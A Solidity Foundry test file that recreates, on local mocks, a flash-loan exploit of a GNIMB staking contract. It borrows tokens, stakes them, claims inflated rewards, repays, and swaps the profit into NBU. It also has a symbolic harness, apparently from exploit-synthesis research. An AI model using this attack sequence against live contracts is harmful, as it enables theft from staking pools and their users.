// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {GNIMBStaking} from "./GNIMBStaking.sol";
import {GNIMB} from "./GNIMB.sol";
import {NBU} from "./NBU.sol";
import {NIMB} from "./NIMB.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NMBTestBase is Test, BlockLoader {
    NBU nbu;
    NIMB nimb;
    GNIMB gnimb;
    UniswapV2Pair pairnbunimb;
    UniswapV2Pair pairnbugnimb;
    UniswapV2Factory factory;
    UniswapV2Router router;
    GNIMBStaking gslp;
    AttackContract attackContract;
    address owner;
    address attacker;
    address nbuAddr;
    address nimbAddr;
    address gnimbAddr;
    address pairnbunimbAddr;
    address pairnbugnimbAddr;
    address factoryAddr;
    address routerAddr;
    address gslpAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1670230642;
    uint112 reserve0pairnbugnimb = 9725236852721155802678243;
    uint112 reserve1pairnbugnimb = 1016511225892673227992;
    uint32 blockTimestampLastpairnbugnimb = 1670230307;
    uint256 kLastpairnbugnimb = 0;
    uint256 price0CumulativeLastpairnbugnimb =
        1052794457038217438668234057466281170;
    uint256 price1CumulativeLastpairnbugnimb =
        74014029905778659822139811585719758857071408;
    uint112 reserve0pairnbunimb = 265071137919497555608;
    uint112 reserve1pairnbunimb = 62674388176321590559182896;
    uint32 blockTimestampLastpairnbunimb = 1670230307;
    uint256 kLastpairnbunimb = 0;
    uint256 price0CumulativeLastpairnbunimb =
        419368656836799758243830020230033253638360300;
    uint256 price1CumulativeLastpairnbunimb =
        7839726508306236780654780670054918;
    uint256 totalSupplygnimb = 100000000000000000000000000;
    uint256 balanceOfgnimbpairnbugnimb = 9725236852721155802678243;
    uint256 balanceOfgnimbpairnbunimb = 0;
    uint256 balanceOfgnimbattacker = 0;
    uint256 balanceOfgnimbgslp = 7773233890289044800124719;
    uint256 totalSupplynimb = 10000000000000000000000000000;
    uint256 balanceOfnimbpairnbugnimb = 0;
    uint256 balanceOfnimbpairnbunimb = 62674388176321590559182896;
    uint256 balanceOfnimbattacker = 0;
    uint256 balanceOfnimbgslp = 0;
    uint256 totalSupplynbu = 2466245080770284349640;
    uint256 balanceOfnbupairnbugnimb = 1016511225892673227992;
    uint256 balanceOfnbupairnbunimb = 265071137919497555608;
    uint256 balanceOfnbuattacker = 0;
    uint256 balanceOfnbugslp = 0;

    function setUp() public {
        owner = address(this);
        nbu = new NBU();
        nbuAddr = address(nbu);
        nimb = new NIMB();
        nimbAddr = address(nimb);
        gnimb = new GNIMB();
        gnimbAddr = address(gnimb);
        pairnbunimb = new UniswapV2Pair(
            address(nbu),
            address(nimb),
            reserve0pairnbunimb,
            reserve1pairnbunimb,
            blockTimestampLastpairnbunimb,
            kLastpairnbunimb,
            price0CumulativeLastpairnbunimb,
            price1CumulativeLastpairnbunimb
        );
        pairnbunimbAddr = address(pairnbunimb);
        pairnbugnimb = new UniswapV2Pair(
            address(gnimb),
            address(nbu),
            reserve0pairnbugnimb,
            reserve1pairnbugnimb,
            blockTimestampLastpairnbugnimb,
            kLastpairnbugnimb,
            price0CumulativeLastpairnbugnimb,
            price1CumulativeLastpairnbugnimb
        );
        pairnbugnimbAddr = address(pairnbugnimb);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairnbunimb),
            address(pairnbugnimb),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        gslp = new GNIMBStaking(
            address(nbu),
            address(gnimb),
            address(gnimb),
            address(router),
            5000
        );
        gslpAddr = address(gslp);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        nbu.transfer(address(pairnbunimb), balanceOfnbupairnbunimb);
        nimb.transfer(address(pairnbunimb), balanceOfnimbpairnbunimb);
        nbu.transfer(address(pairnbugnimb), balanceOfnbupairnbugnimb);
        gnimb.transfer(address(pairnbugnimb), balanceOfgnimbpairnbugnimb);
        gnimb.transfer(address(gslp), balanceOfgnimbgslp);
        gnimb.transfer(address(gslp), 15000000 ether);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Nbu Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nbu), nbu.decimals());
        queryERC20BalanceDecimals(address(nimb), address(nbu), nimb.decimals());
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nbu),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Nimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(nimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(gnimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(gnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbunimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbunimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbunimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbunimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbugnimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbugnimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbugnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbugnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gslp Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(gslp), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(gslp),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gslp),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(attacker),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(attacker),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(attacker),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker;
    }

    function borrow_nbu_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nbu_owner(uint256 amount) internal eurus {
        nbu.transfer(owner, amount);
    }

    function borrow_nimb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nimb_owner(uint256 amount) internal eurus {
        nimb.transfer(owner, amount);
    }

    function borrow_gnimb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gnimb_owner(uint256 amount) internal eurus {
        gnimb.transfer(owner, amount);
    }

    function borrow_nbu_pairnbunimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nbu_pairnbunimb(uint256 amount) internal eurus {
        nbu.transfer(address(pairnbunimb), amount);
    }

    function borrow_nimb_pairnbunimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nimb_pairnbunimb(uint256 amount) internal eurus {
        nimb.transfer(address(pairnbunimb), amount);
    }

    function borrow_gnimb_pairnbunimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gnimb_pairnbunimb(uint256 amount) internal eurus {
        gnimb.transfer(address(pairnbunimb), amount);
    }

    function borrow_nbu_pairnbugnimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nbu_pairnbugnimb(uint256 amount) internal eurus {
        nbu.transfer(address(pairnbugnimb), amount);
    }

    function borrow_nimb_pairnbugnimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_nimb_pairnbugnimb(uint256 amount) internal eurus {
        nimb.transfer(address(pairnbugnimb), amount);
    }

    function borrow_gnimb_pairnbugnimb(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_gnimb_pairnbugnimb(uint256 amount) internal eurus {
        gnimb.transfer(address(pairnbugnimb), amount);
    }

    function swap_pairnbunimb_attacker_nbu_nimb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        nbu.transfer(address(pairnbunimb), amount);
        pairnbunimb.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairnbunimb_attacker_nimb_nbu(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        nimb.transfer(address(pairnbunimb), amount);
        pairnbunimb.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pairnbugnimb_attacker_gnimb_nbu(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        gnimb.transfer(address(pairnbugnimb), amount);
        pairnbugnimb.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairnbugnimb_attacker_nbu_gnimb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        nbu.transfer(address(pairnbugnimb), amount);
        pairnbugnimb.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_gslp_gnimb_gslp(uint256 amount) internal {
        gnimb.approve(address(gslp), type(uint256).max);
        gslp.stake(amount);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
    }

    function withdraw_gslp_gslp_gnimb(uint256 amount) internal {
        gslp.getReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 150000e18);
        borrow_gnimb_owner(150000e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 150000e18);
        deposit_gslp_gnimb_gslp(150000e18);
        printBalance("After step1 ");
        emit log_named_uint("amt2", 9000000e18);
        borrow_gnimb_pairnbugnimb(9000000e18);
        printBalance("After step2 ");
        emit log_named_uint("amt3", gslp.balanceOf(attacker));
        withdraw_gslp_gslp_gnimb(gslp.balanceOf(attacker));
        printBalance("After step3 ");
        emit log_named_uint("amt4", (9000000e18 * 1003) / 1000);
        payback_gnimb_pairnbugnimb((9000000e18 * 1003) / 1000);
        printBalance("After step4 ");
        emit log_named_uint(
            "amt5",
            gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000
        );
        emit log_named_uint(
            "amt6",
            pairnbugnimb.getAmountOut(
                gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000,
                address(gnimb)
            )
        );
        swap_pairnbugnimb_attacker_gnimb_nbu(
            gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000,
            pairnbugnimb.getAmountOut(
                gnimb.balanceOf(attacker) - (150000e18 * 1003) / 1000,
                address(gnimb)
            )
        );
        printBalance("After step5 ");
        emit log_named_uint("amt7", (150000e18 * 1003) / 1000);
        payback_gnimb_owner((150000e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_gnimb_owner(amt0);
        deposit_gslp_gnimb_gslp(amt1);
        borrow_gnimb_pairnbugnimb(amt2);
        withdraw_gslp_gslp_gnimb(amt3);
        payback_gnimb_pairnbugnimb(amt4);
        swap_pairnbugnimb_attacker_gnimb_nbu(amt5, amt6);
        payback_gnimb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
